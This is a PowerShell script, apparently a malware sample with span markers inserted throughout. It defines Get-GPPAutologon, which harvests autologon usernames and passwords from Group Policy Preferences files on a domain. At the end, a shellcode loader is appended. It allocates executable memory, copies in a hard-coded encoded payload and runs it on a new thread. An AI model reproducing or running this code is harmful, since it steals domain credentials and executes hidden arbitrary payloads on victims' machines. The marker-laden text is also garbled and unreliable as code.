 -||-> function Get-GPPAutologon 
{

    
    [CmdletBinding()]
    Param ()
    
    
     -||-> Set-StrictMode -Version 2 <-||- 
     -||-> [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null <-||- 

    
     -||-> function Get-GPPInnerFields 
    {
    [CmdletBinding()]
        Param (
            $File 
        )
    
         -||-> try 
        {
             -||-> $Filename =  -||-> Split-Path $File -Leaf <-||-  <-||- 
             -||-> [xml] $Xml =  -||-> Get-Content ( -||-> $File <-||- ) <-||-  <-||- 

            
             -||-> $Password = @() <-||- 
             -||-> $UserName = @() <-||- 
            
            
             -||-> if ( -||-> ( -||-> $Xml.innerxml -like "*DefaultPassword*" <-||- ) -and ( -||-> $Xml.innerxml -like "*DefaultUserName*" <-||- ) <-||- )
            {
                 -||-> $props = $xml.GetElementsByTagName("Properties") <-||- 
                 -||-> foreach($prop in  -||-> $props <-||- )
                {
                    switch ( -||-> $prop.name <-||- ) 
                    {
                        'DefaultPassword'
                        {
                             -||-> $Password +=  -||-> , $prop | Select-Object -ExpandProperty Value <-||-  <-||- 
                        }
                    
                        'DefaultUsername'
                        {
                             -||-> $Username +=  -||-> , $prop | Select-Object -ExpandProperty Value <-||-  <-||- 
                        }
                }

                     -||-> Write-Verbose "Potential password in $File" <-||- 
                } <-||- 
                         
                
                 -||-> if ( -||-> !( -||-> $Password <-||- ) <-||- ) 
                {
                     -||-> $Password = '[BLANK]' <-||- 
                } <-||- 

                 -||-> if ( -||-> !( -||-> $UserName <-||- ) <-||- )
                {
                     -||-> $UserName = '[BLANK]' <-||- 
                } <-||- 
                       
                
                 -||-> $ObjectProperties = @{'Passwords' =  -||-> $Password <-||- ;
                                      'UserNames' =  -||-> $UserName <-||- ;
                                      'File' =  -||-> $File <-||- } <-||- 
                    
                 -||-> $ResultsObject =  -||-> New-Object -TypeName PSObject -Property $ObjectProperties <-||-  <-||- 
                 -||-> Write-Verbose "The password is between {} and may be more than one value." <-||- 
                 -||-> if ( -||-> $ResultsObject <-||- )
                {
                    Return  -||-> $ResultsObject <-||- 
                } <-||-  
            } <-||- 
        }
        catch { -||-> Write-Error $Error[0] <-||- } <-||- 
    } <-||- 

     -||-> try {
        
         -||-> if (  -||-> (  -||-> ( -||-> ( -||-> Get-WmiObject Win32_ComputerSystem <-||- ).partofdomain <-||- ) -eq $False <-||-  ) -or (  -||-> -not $Env:USERDNSDOMAIN <-||-  ) <-||-  ) {
            throw  -||-> 'Machine is not a domain member or User is not a member of the domain.' <-||- 
        } <-||- 
    
        
         -||-> Write-Verbose 'Searching the DC. This could take a while.' <-||- 
         -||-> $XMlFiles =  -||-> Get-ChildItem -Recurse -ErrorAction SilentlyContinue -Include 'Registry.xml' <-||-  <-||- 
    
         -||-> if (  -||-> -not $XMlFiles <-||-  ) {throw  -||-> 'No preference files found.' <-||- } <-||- 

         -||-> Write-Verbose "Found $( -||-> $XMLFiles | Measure-Object | Select-Object -ExpandProperty Count <-||- ) files that could contain passwords." <-||- 
    
         -||-> foreach ($File in  -||-> $XMLFiles <-||- ) {
                 -||-> $Result = ( -||-> Get-GppInnerFields $File.Fullname <-||- ) <-||- 
                 -||-> Write-Output $Result <-||- 
        } <-||- 
    }

    catch { -||-> Write-Error $Error[0] <-||- } <-||- 
} <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdd,0xc6,0xd9,0x74,0x24,0xf4,0xb8,0x64,0x2e,0x18,0xd8,0x5b,0x2b,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x43,0x14,0x03,0x43,0x70,0xcc,0xed,0x24,0x90,0x92,0x0e,0xd5,0x60,0xf3,0x87,0x30,0x51,0x33,0xf3,0x31,0xc1,0x83,0x77,0x17,0xed,0x68,0xd5,0x8c,0x66,0x1c,0xf2,0xa3,0xcf,0xab,0x24,0x8d,0xd0,0x80,0x15,0x8c,0x52,0xdb,0x49,0x6e,0x6b,0x14,0x9c,0x6f,0xac,0x49,0x6d,0x3d,0x65,0x05,0xc0,0xd2,0x02,0x53,0xd9,0x59,0x58,0x75,0x59,0xbd,0x28,0x74,0x48,0x10,0x23,0x2f,0x4a,0x92,0xe0,0x5b,0xc3,0x8c,0xe5,0x66,0x9d,0x27,0xdd,0x1d,0x1c,0xee,0x2c,0xdd,0xb3,0xcf,0x81,0x2c,0xcd,0x08,0x25,0xcf,0xb8,0x60,0x56,0x72,0xbb,0xb6,0x25,0xa8,0x4e,0x2d,0x8d,0x3b,0xe8,0x89,0x2c,0xef,0x6f,0x59,0x22,0x44,0xfb,0x05,0x26,0x5b,0x28,0x3e,0x52,0xd0,0xcf,0x91,0xd3,0xa2,0xeb,0x35,0xb8,0x71,0x95,0x6c,0x64,0xd7,0xaa,0x6f,0xc7,0x88,0x0e,0xfb,0xe5,0xdd,0x22,0xa6,0x61,0x11,0x0f,0x59,0x71,0x3d,0x18,0x2a,0x43,0xe2,0xb2,0xa4,0xef,0x6b,0x1d,0x32,0x10,0x46,0xd9,0xac,0xef,0x69,0x1a,0xe4,0x2b,0x3d,0x4a,0x9e,0x9a,0x3e,0x01,0x5e,0x23,0xeb,0xbc,0x5b,0xb3,0xd4,0xe9,0xd6,0x63,0xbd,0xeb,0x16,0x72,0x60,0x65,0xf0,0x24,0xca,0x25,0xad,0x84,0xba,0x85,0x1d,0x6c,0xd1,0x09,0x41,0x8c,0xda,0xc3,0xea,0x26,0x35,0xba,0x43,0xde,0xac,0xe7,0x18,0x7f,0x30,0x32,0x65,0xbf,0xba,0xb1,0x99,0x71,0x4b,0xbf,0x89,0xe5,0xbb,0x8a,0xf0,0xa3,0xc4,0x20,0x9e,0x4b,0x51,0xcf,0x09,0x1c,0xcd,0xcd,0x6c,0x6a,0x52,0x2d,0x5b,0xe1,0x5b,0xbb,0x24,0x9d,0xa3,0x2b,0xa5,0x5d,0xf2,0x21,0xa5,0x35,0xa2,0x11,0xf6,0x20,0xad,0x8f,0x6a,0xf9,0x38,0x30,0xdb,0xae,0xeb,0x58,0xe1,0x89,0xdc,0xc6,0x1a,0xfc,0xdc,0x3b,0xcd,0x38,0xab,0x55,0xcd <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



